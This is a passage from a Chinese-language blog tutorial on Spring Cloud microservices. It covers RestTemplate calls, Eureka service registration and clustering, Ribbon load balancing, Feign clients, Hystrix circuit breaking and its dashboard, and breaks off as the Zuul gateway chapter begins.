title="第二章、Spring Cloud概要"></a>第二章、Spring Cloud概要</h1><ul><li>官网: <a href="http://spring.io/projects/spring-cloud">http://spring.io/projects/spring-cloud</a></li><li>各组件说明（中文版）：<a href="https://springcloud.cc/spring-cloud-netflix.html">https://springcloud.cc/spring-cloud-netflix.html</a></li><li>详细文档版：英文版：<a href="https://cloud.spring.io/spring-cloud-static/Finchley.SR2/single/spring-cloud.html">https://cloud.spring.io/spring-cloud-static/Finchley.SR2/single/spring-cloud.html</a></li><li>中文版：<a href="https://springcloud.cc/spring-cloud-dalston.htmlSpring">https://springcloud.cc/spring-cloud-dalston.htmlSpring</a> </li><li>Cloud 中国社区：<a href="http://springcloud.cn/Spring">http://springcloud.cn/Spring</a> </li><li>Cloud 中文网：<a href="https://springcloud.c/">https://springcloud.c</a></li></ul><h2 id="2-1、什么是SpringCloud"><a href="#2-1、什么是SpringCloud" class="headerlink" title="2.1、什么是SpringCloud"></a>2.1、什么是SpringCloud</h2><p>​        SpringCloud是基于Springboot进行开发的(Springboot可以离开SpringCloud进行开发，但是SpringCloud离不开Springboot)，提供了一套微服务解决方案，包括服务注册与发现，配置中心，全链路监控，服务网关，负载均衡，熔断器等组件，除了基于NetFlix的开源组件做高度抽象封装之外，还有一些选型中立的开源组件。</p><p>​        SpringCloud使用RESTful API实现服务之间通行</p><p>​        Dubbo使用RPC(远程过程调用)实现服务之间通信</p><h1 id="第三章、Rest构建分布式微服务架构"><a href="#第三章、Rest构建分布式微服务架构" class="headerlink" title="第三章、Rest构建分布式微服务架构"></a>第三章、Rest构建分布式微服务架构</h1><h2 id="3-1、自定义Rest配置类"><a href="#3-1、自定义Rest配置类" class="headerlink" title="3.1、自定义Rest配置类"></a>3.1、自定义Rest配置类</h2><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConfigBean</span> </span>&#123;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 向容器中添加 RestTemplate 组件,直接通过此组件可调用 REST 接口</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Bean</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> RestTemplate <span class="hljs-title">getRestTemplate</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> RestTemplate();    &#125;&#125;</code></pre><h2 id="3-2、使用RestTemplate"><a href="#3-2、使用RestTemplate" class="headerlink" title="3.2、使用RestTemplate"></a>3.2、使用RestTemplate</h2><p>​     RestTemplate 组件, 提供了多种简单便捷的访问 Restful 服务的方法，是Spring提供的用于访<br>问Rest服务的客户端模板工具集。 (url, requestMap, ResponseBean.class)这三个参数分别代表：<br>REST请求地址、请求参数、HTTP响应转换被转换成的对象类型。</p><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProductController_Consumer</span> </span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String REST_URL_PREFIX = <span class="hljs-string">&quot;http://localhost:8001&quot;</span>;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> RestTemplate restTemplate;    <span class="hljs-meta">@RequestMapping(value = &quot;/consumer/product/add&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">add</span><span class="hljs-params">(Product product)</span> </span>&#123;        <span class="hljs-keyword">return</span> restTemplate.postForObject(REST_URL_PREFIX + <span class="hljs-string">&quot;/product/add&quot;</span>, product, Boolean.class);    &#125;    <span class="hljs-meta">@RequestMapping(value = &quot;/consumer/product/get/&#123;id&#125;&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> Product <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long id)</span> </span>&#123;        <span class="hljs-keyword">return</span> restTemplate.getForObject(REST_URL_PREFIX + <span class="hljs-string">&quot;/product/get/&quot;</span> + id, Product.class);    &#125;    <span class="hljs-meta">@RequestMapping(value = &quot;/consumer/product/list&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title">list</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> restTemplate.getForObject(REST_URL_PREFIX + <span class="hljs-string">&quot;/product/list&quot;</span>, List.class);    &#125;&#125;</code></pre><h1 id="第四章、Eureka-服务的注册与发现"><a href="#第四章、Eureka-服务的注册与发现" class="headerlink" title="第四章、Eureka 服务的注册与发现"></a>第四章、Eureka 服务的注册与发现</h1><p>为什么要用注册中心？</p><ol><li>微服务数量众多，要进行远程调用就需要知道服务端的ip地址和端口，注册中心帮助我们管理这些服务<br>的ip和端口。</li><li>微服务会实时上报自己的状态，注册中心统一管理这些微服务的状态，将存在问题的服务踢出服务列<br>表，客户端获取到可用的服务进行调用</li></ol><h2 id="4-1、Eureka介绍"><a href="#4-1、Eureka介绍" class="headerlink" title="4.1、Eureka介绍"></a>4.1、Eureka介绍</h2><ul><li>Spring Cloud Eureka 是对Netflix公司的Eureka的二次封装，它实现了服务治理的功能，Spring Cloud<br>Eureka 提供 Eureka Server 服务端与 Eureka Client 客户端 ，服务端即是Eureka服务注册中心，客户端完成<br>微服务向Eureka服务的注册与发现</li><li>客户端同时也具备一个内置的使用轮询(round-robin)负载算法的负载均衡器。在微服务启动后，将会向<br>Eureka Server发送心跳(默认周期为30秒)。如果Eureka Server在多个心跳周期内没有接收到某个节点的心<br>跳，EurekaServer将会从服务注册表中把这个服务节点移除（默认90秒）</li></ul><pre><code class="hljs java"><span class="hljs-number">1.</span> Eureka Server 是服务端，负责管理各个微服务注册和发现。<span class="hljs-number">2.</span> 在微服务上添加 Eureka Client 代码，就会访问到 Eureka Server 将此微服务注册在Eureka Server中，从而使服务消费方能够找到。<span class="hljs-number">3.</span> 微服务（服务消费者）需要调用另一个微服务（服务提供者）时，从 Eureka Server 中获取服务调用地址，进行远程调用。</code></pre><h2 id="4-2、搭建单机版-Eureka-Server-服务注册中心"><a href="#4-2、搭建单机版-Eureka-Server-服务注册中心" class="headerlink" title="4.2、搭建单机版 Eureka Server 服务注册中心"></a>4.2、搭建单机版 Eureka Server 服务注册中心</h2><pre><code class="hljs java"><span class="hljs-number">1</span>、引入pom坐标&lt;!--Eureka-server 服务端依赖--&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;        &lt;/dependency&gt;  <span class="hljs-number">2</span>、配置文件  server:  port: 6001 # 服务端口eureka:  instance:    hostname: localhost # eureka服务端的实例名称  client:    registerWithEureka: false # 服务注册，false表示不将自已注册到Eureka服务中    fetchRegistry: false # 服务发现，false表示自己不从Eureka服务中获取注册信息    serviceUrl: # Eureka客户端与Eureka服务端的交互地址，集群版配置对方的地址，单机版配置自己（如果不配置则默认本机8761端口）      defaultZone: http:<span class="hljs-comment">//$&#123;eureka.instance.hostname&#125;:$&#123;server.port&#125;/eureka/</span><span class="hljs-number">3</span>、启动类   添加注解 <span class="hljs-meta">@EnableEurekaServer</span> <span class="hljs-comment">//标识一个Eureka Server服务注册中心</span></code></pre><h2 id="4-3、服务注册到-Eureka-Server-服务注册中心"><a href="#4-3、服务注册到-Eureka-Server-服务注册中心" class="headerlink" title="4.3、服务注册到 Eureka Server 服务注册中心"></a>4.3、服务注册到 Eureka Server 服务注册中心</h2><pre><code class="hljs java"><span class="hljs-number">1</span>、引入pom坐标      &lt;!-- 导入Eureka客户端的依赖，将 微服务提供者 注册进 Eureka --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;        &lt;/dependency&gt;  <span class="hljs-number">2</span>、配置文件# 将服务提供者 注册到 Eureka服务注册中心eureka:  client:    registerWithEureka: true # 服务注册开关    fetchRegistry: true # 服务发现开关    serviceUrl: # 客户端(服务提供者)注册到哪一个Eureka Server服务注册中心，多个用逗号分隔      defaultZone: http:<span class="hljs-comment">//localhost:6001/eureka</span>  instance:    instanceId: $&#123;spring.application.name&#125;:$&#123;server.port&#125; # 指定实例ID,就不会显示主机名了    prefer-ip-address: true # 鼠标放到实例ID上后显示 ip地址<span class="hljs-number">3</span>、启动类  添加注解 <span class="hljs-meta">@EnableEurekaClient</span> <span class="hljs-comment">//本服务启动后会自动注册进Eureka中心</span></code></pre><h2 id="4-4、Eureka-Server自我保护机制"><a href="#4-4、Eureka-Server自我保护机制" class="headerlink" title="4.4、Eureka Server自我保护机制"></a>4.4、Eureka Server自我保护机制</h2><h4 id=""><a href="#" class="headerlink" title=""></a><img src="/images/spring-cloud-eureka-%E8%87%AA%E6%88%91%E4%BF%9D%E6%8A%A41.png"></h4><pre><code class="hljs java">【自我保护现象】   如长时间没有访问、检测不到心跳，或者修改实例名称，eureka启动自我保护机制下图红色提示信息：表示已启动了自我保护机制在某时刻某一个微服务不可用了，Eureka不会立刻删除，依旧会对该微服务的信息进行保存  【自我保护机制】   当Eureka Server 在一定时间内（默认<span class="hljs-number">90</span>秒）没有接收到某个微服务的心跳，Eureka Server会从服务列表将此服务实例注销。但是如果出现网络异常情况（微服务本身是正常的），微服务与Eureka Server之间无法正常通信，以上行为可能变得非常危险了——因为微服务本身其实是正常的，此时本不应该注销这个微服务。   Eureka Server有一种 “自我保护模式” 来解决这个问题——当Eureka Server在短时间内丢失过多客户端时（可能发生了网络故障），此时Eureka Server会进入自保护模式，一旦进入该模式，Eureka Server就会保护服务注册表中的信息，不再删除服务注册表中的数据（也就是不会注销任何微服务）。当网络故障恢复后，该Eureka Server会自动退出自我保护模式。   所以，自我保护模式是一种应对网络异常的安全保护措施。它的架构哲学是宁可同时保留所有微服务（健康的微服务和不健康的微服务都会保留），也不盲目注销任何健康的微服务。使用自我保护模式，可以让Eureka集群更加的健壮、稳定。</code></pre><pre><code class="hljs java"><span class="hljs-comment">// 关闭自我保护配置</span>eureka:server:enable-self-preservation: false # 禁用自我保护模式</code></pre><h2 id="4-5、搭建集群版-Eureka-Server-服务注册"><a href="#4-5、搭建集群版-Eureka-Server-服务注册" class="headerlink" title="4.5、搭建集群版 Eureka Server 服务注册"></a>4.5、搭建集群版 Eureka Server 服务注册</h2><p><strong>为了避免 Eureka Server的失效，Eureka Server 高可用环境需要部署两个及以上Eureka Server</strong></p><pre><code class="hljs java"><span class="hljs-number">1</span>、在实际使用时Eureka Server至少部署两台服务器，实现高可用。<span class="hljs-number">2</span>、两台Eureka Server互相注册,注册时需要通过域名访问。<span class="hljs-number">3</span>、微服务需要连接两台Eureka Server注册，当其中一台Eureka死掉也不会影响服务的注册与发现<span class="hljs-number">4</span>、微服务会定时向Eureka Server发送心跳，报告自己的状态。<span class="hljs-number">5</span>、微服务从注册中心获取服务地址以RESTful方式发起远程调用。</code></pre><ul><li>创建新的Eureka Server服务端</li><li>eureka.client.serviceUrl.defaultZone 配置对方服务端的域名地址</li><li>微服务端(消费提供者) eureka.client.serviceUrl.defaultZone: 服务端1地址，服务端1地址。配置两个服务端地址,逗号隔开</li><li>如果配置三台以上服务端，服务端配置 另外两台服务端域名地址，微服务端(消费提供者)配置三个服务端地址即可！</li><li>消费者的集群配置见下章</li></ul><h1 id="第五章、-Ribbon-客户端负载均衡"><a href="#第五章、-Ribbon-客户端负载均衡" class="headerlink" title="第五章、 Ribbon 客户端负载均衡"></a>第五章、 Ribbon 客户端负载均衡</h1><h2 id="5-1、什么是负载"><a href="#5-1、什么是负载" class="headerlink" title="5.1、什么是负载"></a>5.1、什么是负载</h2><pre><code class="hljs java"><span class="hljs-number">1</span>、LB，即负载均衡(Load Balance)，负载均衡是微服务架构中经常使用的一种技术。 负载均衡是我们处理高并发、缓解网络压力和进行服务端扩容的重要手段之一，简单的说就是将用户的请求平摊的分配到多个服务上，从而实现系统的高可用性集群。<span class="hljs-number">2</span>、负载均衡可通过 硬件设备 及 软件 进行实现，软件比如：Nginx等，硬件比如：F5等<span class="hljs-number">3</span>、负载均衡相应的在中间件，例如：Dubbo 和 SpringCloud 中均给我们提供了负载均衡组件</code></pre><h2 id="5-2、什么是客户端负载均衡（Ribbon）"><a href="#5-2、什么是客户端负载均衡（Ribbon）" class="headerlink" title="5.2、什么是客户端负载均衡（Ribbon）"></a>5.2、什么是客户端负载均衡（Ribbon）</h2><p>​    客户端负载均衡 与 服务端负载均衡的区别在于：客户端负载均衡要维护一份服务列表。客户端负载均衡和服务端负载均衡最大的区别在于<strong>服务清单所存储的位置</strong>。在客户端负载均衡中，每个客户端服务都有一份自己要访问的服务端清单，这些清单统统都是从Eureka服务注册中心获取的。而在服务端负载均衡中，只要负载均衡器维护一份服务端列表 。</p><p>​        Ribbon 从 Eureka Server 获取服务列表，Ribbon根据负载均衡算法直接请求到具体的微服务，中间省去了负载均衡服务。</p><p>​        <strong>简单来说</strong>，nginx负载均衡属于服务端负载均衡，所有请求必须先通过nginx，然后nginx中配置了所有服务端，根据负载均衡算法进行分配。而Ribbon属于客户端负载均衡，所有请求直接访问，没有中间的nginx(也可以理解为每个客户端有配置了nginx)，每个客户端都知道所有的消费提供者，然后根据负载均衡算法自己进行选择。</p><h2 id="5-3、-Ribbon-服务调用配置实战"><a href="#5-3、-Ribbon-服务调用配置实战" class="headerlink" title="5.3、 Ribbon 服务调用配置实战"></a>5.3、 Ribbon 服务调用配置实战</h2><pre><code class="hljs java"><span class="hljs-number">1</span>、服务消费者端(<span class="hljs-number">80</span>)引入pom坐标&lt;!-- Ribbon 相关依赖,eureka会自动引入Ribbon --&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;<span class="hljs-number">2</span>、修改application.yml配置文件eureka:  client:    registerWithEureka: false # 服务注册，false表示不将自已注册到Eureka服务中    fetchRegistry: true # 服务发现，false表示自己不从Eureka服务中获取注册信息    serviceUrl: # Eureka客户端与Eureka服务端的交互地址，集群版配置对方的地址，单机版配置自己（如果不配置则默认本机8761端口）      defaultZone: http:<span class="hljs-comment">//eureka6001.com:6001/eureka/,http://eureka6002.com:6002/eureka/</span><span class="hljs-number">3</span>、修改自定义配置类ConfigBean  添加<span class="hljs-meta">@LoadBalanced</span>注解，<span class="hljs-meta">@LoadBalanced</span>表示这个RestTemplate开启负载均衡，在调用服务提供者的接口时，可使用服务名称替代真实IP地址。服务名称 就是服务提供者在application.yml中配置的spring.application.name属性的值 。<span class="hljs-number">4</span>、 修改消费者控制层(根据第三步)  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String REST_URL_PREFIX = <span class="hljs-string">&quot;http://spring-cloud-product&quot;</span>;</code></pre><h2 id="5-4、-Ribbon-负载均衡架构"><a href="#5-4、-Ribbon-负载均衡架构" class="headerlink" title="5.4、 Ribbon 负载均衡架构"></a>5.4、 Ribbon 负载均衡架构</h2><p>Ribbon 在工作时分成两步</p><ul><li>先选择 Eureka Server ,它优先选择在同一个区域内负载较少的server</li><li>再根据用户指定的策略，在从 Eureka Server 获取的服务注册列表中选择一个地址。 其中Ribbon提供了多种策略：比如轮询、随机和根据响应时间加权等。    </li></ul><p><img src="/images/SpringCloud-Ribbon.png"></p><h1 id="第六章、Feign-客户端接口调用"><a href="#第六章、Feign-客户端接口调用" class="headerlink" title="第六章、Feign 客户端接口调用"></a>第六章、Feign 客户端接口调用</h1><h2 id="6-1、什么是Feign"><a href="#6-1、什么是Feign" class="headerlink" title="6.1、什么是Feign"></a>6.1、什么是Feign</h2><p>​        Feign是Netflix公司开源的轻量级Rest客户端( <a href="https://github.com/OpenFeign/feign">https://github.com/OpenFeign/feign</a> )，使用 Feign 可以非常方便、简单的实现 Http 客户端，使用 Feign 只需要定义一个接口，然后在接口上添加注解即可。Spring Cloud 对 Feign 进行了封装，Feign <strong>默认集成了 Ribbon</strong> 实现了客户端负载均衡调用。</p><pre><code class="hljs java"><span class="hljs-number">1</span>、引入pom坐标&lt;!--feign 依赖--&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt;  <span class="hljs-number">2</span>、创建接口<span class="hljs-comment">/**</span><span class="hljs-comment"> * 指定调用的服务 spring-cloud-product</span><span class="hljs-comment"> */</span><span class="hljs-meta">@FeignClient(value = &quot;spring-cloud-product&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ProductClientService</span> </span>&#123;    <span class="hljs-meta">@RequestMapping(value = &quot;/product/get/&#123;id&#125;&quot;,method = RequestMethod.GET)</span>    <span class="hljs-function">Product <span class="hljs-title">get</span><span class="hljs-params">(Long id)</span></span>;    <span class="hljs-meta">@RequestMapping(value = &quot;/product/list&quot;,method = RequestMethod.GET)</span>    <span class="hljs-function">List&lt;Product&gt; <span class="hljs-title">list</span><span class="hljs-params">()</span></span>;    <span class="hljs-meta">@RequestMapping(value = &quot;/product/add&quot;,method = RequestMethod.POST)</span>    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">add</span><span class="hljs-params">(Product product)</span></span>;&#125;<span class="hljs-number">3</span>、controller<span class="hljs-meta">@RestController</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProductController_Consumer__Feign</span> </span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> ProductClientService productClientService;    <span class="hljs-meta">@RequestMapping(value = &quot;/consumer/product/add&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">add</span><span class="hljs-params">(Product product)</span> </span>&#123;        <span class="hljs-keyword">return</span> productClientService.add(product);    &#125;        <span class="hljs-meta">@RequestMapping(value = &quot;/consumer/product/get/&#123;id&#125;&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> Product <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long id)</span> </span>&#123;        <span class="hljs-keyword">return</span> productClientService.get(id);    &#125;        <span class="hljs-meta">@RequestMapping(value = &quot;/consumer/product/list&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title">list</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> productClientService.list();    &#125;&#125;<span class="hljs-number">4</span>、启动类  <span class="hljs-comment">//会扫描标记了指定包下@FeignClient注解的接口，并生成此接口的代理对象</span>  添加注解 <span class="hljs-meta">@EnableFeignClients(basePackages = &#123;&quot;com.demo.service&quot;&#125;)</span></code></pre><h2 id="6-2、-Feign-注意事项"><a href="#6-2、-Feign-注意事项" class="headerlink" title="6.2、 Feign 注意事项"></a>6.2、 Feign 注意事项</h2><p>SpringCloud对Feign进行了增强兼容了SpringMVC的注解 ，我们在使用SpringMVC的注解时需要注意：</p><ul><li>@FeignClient接口方法有基本类型参数在参数必须加@PathVariable(“XXX”) 或 @RequestParam(“XXX”)</li><li>@FeignClient接口方法返回值为复杂对象时，此类型必须有无参构造方法。</li></ul><h1 id="第七章、Hystrix-熔断器-断路器"><a href="#第七章、Hystrix-熔断器-断路器" class="headerlink" title="第七章、Hystrix 熔断器(断路器)"></a>第七章、Hystrix 熔断器(断路器)</h1><h2 id="7-1、什么是Hystrix"><a href="#7-1、什么是Hystrix" class="headerlink" title="7.1、什么是Hystrix"></a>7.1、什么是Hystrix</h2><p>​    在服务之间调用的链路上由于网络原因、资源繁忙或者自身的原因，服务并不能保证100%可用，如果单个服务出现问题，调用这个服务就会出现线程阻塞，导致响应时间过长或不可用，此时若有大量的请求涌入，容器的线程资源会被消耗完毕，导致服务瘫痪。服务与服务之间的依赖性，故障会传播，会对整个微服务系统造成灾难性的严重后果，这就是服务故障的“雪崩”效应。<br>​    为了解决这个问题，业界提出了熔断器模型。</p><p>​     Hystrix 是Netflix公司开源项目( <a href="https://github.com/Netflix/Hystrix)%EF%BC%8C%E5%AE%9E%E7%8E%B0%E4%BA%86%E7%86%94%E6%96%AD%E5%99%A8%E6%A8%A1%E5%9E%8B%EF%BC%8CSpring">https://github.com/Netflix/Hystrix)，实现了熔断器模型，Spring</a> Cloud 对这一组件进行了整合。具有<strong>服务熔断</strong>、<strong>服务监控</strong>的作用。</p><h2 id="7-2、服务熔断"><a href="#7-2、服务熔断" class="headerlink" title="7.2、服务熔断"></a>7.2、服务熔断</h2><p>​    熔断机制是应对雪崩效应的一种微服务链路保护机制。在微服务架构中，一个请求需要调用多个服务是非常常见的当服务之间调用的链路上某个微服务不可用或者响应时间太长时，会导致连锁故障。当失败的调用到一定阈值（缺省是5秒内20次调用失败) 就会启动熔断机制。在 SpringCloud 框架里熔断机制通过Hystrix实现，Hystrix会监控微服务间调用的状况。熔断机制的注解是**@HystrixCommand<strong>，熔断器打开后，可用避免连锁故障</strong>fallback**方法可以直接返回一个固定值。</p><p>​    服务熔断分为 <strong>服务端熔断</strong> 和 <strong>客户端熔断</strong></p><h3 id="7-2-1、-服务端熔断"><a href="#7-2-1、-服务端熔断" class="headerlink" title="7.2.1、 服务端熔断"></a>7.2.1、 服务端熔断</h3><pre><code class="hljs java"><span class="hljs-number">1</span>、导入pom坐标&lt;!-- 导入hystrix依赖 --&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;&lt;/dependency&gt;<span class="hljs-number">2</span>、修改Controller，如果出现异常，使用<span class="hljs-meta">@HystrixCommand</span>注解，如果出现异常，会自动调用 <span class="hljs-meta">@HystrixCommand</span> 注解中 fallbackMethod属性指定的当前类中的方法  <span class="hljs-comment">//当get方法出现异常时，则会调用hystrixGet方法处理</span><span class="hljs-meta">@HystrixCommand(fallbackMethod = &quot;getFallback&quot;)</span><span class="hljs-meta">@RequestMapping(value = &quot;/product/get/&#123;id&#125;&quot;, method = RequestMethod.GET)</span><span class="hljs-function"><span class="hljs-keyword">public</span> Product <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long id)</span> </span>&#123;Product product = productService.get(id);<span class="hljs-comment">//模拟异常</span><span class="hljs-keyword">if</span>(product == <span class="hljs-keyword">null</span>) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(<span class="hljs-string">&quot;ID=&quot;</span> + id + <span class="hljs-string">&quot;无效&quot;</span>);&#125;<span class="hljs-keyword">return</span> product;&#125;<span class="hljs-number">3</span>、启动类添加 注解 <span class="hljs-meta">@EnableHystrix</span> 开启 Hystrix 熔断机制的支持</code></pre><h3 id="7-2-2、Feign-客户端服务熔断"><a href="#7-2-2、Feign-客户端服务熔断" class="headerlink" title="7.2.2、Feign 客户端服务熔断"></a>7.2.2、Feign 客户端服务熔断</h3><p>Feign 是自带断路器的，也就是针对 消费者（客户端）进行服务熔断，需要在配置文件中开启它</p><pre><code class="hljs java"><span class="hljs-number">1</span>、配置文件开启 hystrix# 需要开启 hystrixfeign:hystrix:enabled: <span class="hljs-keyword">true</span>      <span class="hljs-number">2</span>、在已存在的接口上的<span class="hljs-meta">@FeignClient</span> 注解中，加上 fallback 指定熔断处理类即可<span class="hljs-meta">@FeignClient(value = &quot;MICROSERVICE-PRODUCT&quot;, fallback =ProductClientServiceFallBack.class)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ProductClientService</span> </span>&#123;<span class="hljs-meta">@RequestMapping(value = &quot;/product/get/&#123;id&#125;&quot;,method = RequestMethod.GET)</span><span class="hljs-function">Product <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long id)</span></span>; &#125;<span class="hljs-number">3</span>、创建熔断处理类,并实现接口,在将熔断处理类注入bean中<span class="hljs-meta">@Component</span> <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProductClientServiceFallBack</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ProductClientService</span> </span>&#123;<span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> Product <span class="hljs-title">get</span><span class="hljs-params">(Long id)</span> </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Product(id, <span class="hljs-string">&quot;id=&quot;</span>+ id + <span class="hljs-string">&quot;无数据--feign&amp;hystrix&quot;</span>, <span class="hljs-string">&quot;无有效数据库&quot;</span>);&#125;</code></pre><p>注意：如果服务端和客户端都设置了熔断处理，则返回值已客户端为主！</p><h2 id="7-3、-Hystrix-Dashboard监控平台搭建"><a href="#7-3、-Hystrix-Dashboard监控平台搭建" class="headerlink" title="7.3、 Hystrix Dashboard监控平台搭建"></a>7.3、 Hystrix Dashboard监控平台搭建</h2><ul><li>除了隔离依赖服务的调用以外，Hystrix还提供了准实时的调用监控（Hystrix Dashboard），Hystrix会持续地记录所有通过Hystrix发起的请求的执行信息，并以统计报表和图形的形式展示给用户，包括每秒执行多少请求多少成功，多少失败等。</li><li>Netflix 通过 hystrix-metrics-event-stream 项目实现了对以上指标的监控。Spring Cloud也提供了Hystrix Dashboard 的整合，对监控内容转化成可视化界</li></ul><h3 id="7-3-1、什么是服务监控"><a href="#7-3-1、什么是服务监控" class="headerlink" title="7.3.1、什么是服务监控"></a>7.3.1、什么是服务监控</h3><ul><li>除了隔离依赖服务的调用以外，Hystrix还提供了准实时的调用监控（Hystrix Dashboard），Hystrix会持续<br>地记录所有通过Hystrix发起的请求的执行信息，并以统计报表和图形的形式展示给用户，包括每秒执行多少<br>请求多少成功，多少失败等。</li><li>Netflix 通过 hystrix-metrics-event-stream 项目实现了对以上指标的监控。Spring Cloud也提供了<br>Hystrix Dashboard 的整合，对监控内容转化成可视化界面</li></ul><h3 id="7-3-2、搭建服务监控"><a href="#7-3-2、搭建服务监控" class="headerlink" title="7.3.2、搭建服务监控"></a>7.3.2、搭建服务监控</h3><pre><code class="hljs java"><span class="hljs-number">1</span>、添加pom坐标&lt;!--导入 hystrix 与 hystrix-dashboard 依赖--&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-netflix-hystrix-dashboard&lt;/artifactId&gt;&lt;/dependency&gt;<span class="hljs-number">2</span>、启动类 添加 <span class="hljs-meta">@EnableHystrixDashboard</span> 注解开启服务监控  <span class="hljs-number">3</span>、配置application.yml server:port: <span class="hljs-number">9001</span><span class="hljs-number">4</span>、启动微服务监控，访问 http:<span class="hljs-comment">//localhost:9001/hystrix    </span></code></pre><h3 id="7-3-3、为要被监控的服务添加配置"><a href="#7-3-3、为要被监控的服务添加配置" class="headerlink" title="7.3.3、为要被监控的服务添加配置"></a>7.3.3、为要被监控的服务添加配置</h3><pre><code class="hljs java"><span class="hljs-number">1</span>、 在需要监控的服务 pom.xml 中的 dependencies 节点中新增 spring-boot-starter-actuator 监控依赖，以开启监控相关的端点，并确保已经引入断路器的依赖 spring-cloud-starter-netflix-hystrix&lt;!--监控依赖--&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--已经存在 ，则不重复添加--&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;&lt;/dependency&gt;<span class="hljs-number">2</span>、在需要监控的服务 application.yml 配制中添加暴露端点# 在被监控服务上添加暴露端点management:  endpoints:    web:      exposure:        include: hystrix.stream<span class="hljs-number">3</span>、启动项目后，访问 http:<span class="hljs-comment">//localhost:8001/actuator/hystrix.stream 就可以看到json格式数据</span><span class="hljs-number">4</span>、访问服务监控 http:<span class="hljs-comment">//localhost:9001/hystrix </span>   然后输入http:<span class="hljs-comment">//localhost:8001/actuator/hystrix.stream</span>   Delay：<span class="hljs-number">2000</span> Title：product-<span class="hljs-number">8001</span>   点击 Monitor Stream就可以看到图形化界面</code></pre><h3 id="7-3-4、监控图解"><a href="#7-3-4、监控图解" class="headerlink" title="7.3.4、监控图解"></a>7.3.4、监控图解</h3><pre><code class="hljs java">实心圆：颜色的变化代表了实例的健康程度，绿色&lt;黄色&lt;橙色&lt;红色递减 流量越大则实心圆就越大曲线：用来记录<span class="hljs-number">2</span>分钟内流量的相对变化</code></pre><p><img src="/images/hysyrix.png"></p><h1 id="第八章、Zuul路由网关"><a href="#第八章、Zuul路由网关" class="headerlink" title="第八章、Zuul路由网关"></a>第八章、Zuul路由网关</h1><h2 id="8-1、什么是Zuul"><a href="#8-1、什么是Zuul" class="headerlink" title="8.1、什么是Zuul"></a>8.1、什么是Zuul</h2><p>Spring Cloud Zuul 是整合Netflix公司的 Zuul开源项目（官方：<a 